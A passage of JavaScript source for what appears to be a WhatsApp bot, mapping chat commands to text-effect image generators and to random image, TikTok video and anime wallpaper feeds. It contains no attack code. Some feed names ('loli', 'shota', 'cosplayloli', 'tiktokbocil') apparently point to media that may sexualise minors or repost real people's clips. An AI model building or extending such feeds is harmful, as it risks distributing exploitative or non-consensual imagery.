if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
Lucy.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replygcGhost(`Example : ${prefix+command} Lucy`) 
GhostStickWait()
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
Lucy.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{

if (!q) return replygcGhost(`Example : ${prefix+command} Lucy`) 
GhostStickWait()
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
Lucy.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'pornhub':{
if(!q) return replygcGhost(`Example: ${prefix + command} ajg | ea`)
GhostStickWait()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuphub = await textpro2("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anuphub)
Lucy.sendMessage(from,{image:{url:anuphub}, caption:"Here you go!"},{quoted:m})
}
break
case 'retro':{
if(!q) return replygcGhost(`Example: ${prefix + command} ajg | ea`)
GhostStickWait()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anutro2 = await textpro2("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
console.log(anutro2)
Lucy.sendMessage(from,{image:{url:anutro2}, caption:"Here you go!"},{quoted:m})
}
break
case '8bit':{
if(!q) return replygcGhost(`Example: ${prefix + command} ajg | ea`)
GhostStickWait()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anubit8 = await textpro2("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
console.log(anubit8)
Lucy.sendMessage(from,{image:{url:anubit8}, caption:"Here you go!"},{quoted:m})
}
break
case 'batman':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err))
   break
case '3dbox':
if(!q) return replygcGhost(`Example: ${prefix + command} ea`)
GhostStickWait()
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break
case 'lion':
  if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
      `${q}`,])
     .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
     .catch((err) => console.log(err));
     break
case '3davengers':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 
case 'window':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '3dspace':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg | ea`)
GhostStickWait()
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'bokeh':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'holographic':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'thewall':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 
case 'carbon':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'whitebear':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'metallic':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'steel':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'fabric':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'ancient':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'marvel':
if(!q) return replygcGhost(`Example: ${prefix + command} ajg`)
GhostStickWait()
maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
    `${q}`,])
  .then((data) => Lucy.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'tiktokgirl':
GhostStickWait()
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
Lucy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
GhostStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
Lucy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
GhostStickWait()
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
Lucy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
GhostStickWait()
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
Lucy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
GhostStickWait()
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
Lucy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
GhostStickWait()
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
Lucy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
GhostStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
Lucy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
GhostStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'animewallpaper2': case 'animewall2': {
                if (!args.join(" ")) return replygcGhost("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                Lucy.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replygcGhost('What wallpaper do you want?')
GhostStickWait()
const wall = new AnimeWallpaper()
    const pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = Math.floor(Math.random() * wallpaper.length)    
            await Lucy.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('Error!')
                })
//Lucy.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{

GhostStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/cosplayloli.json')
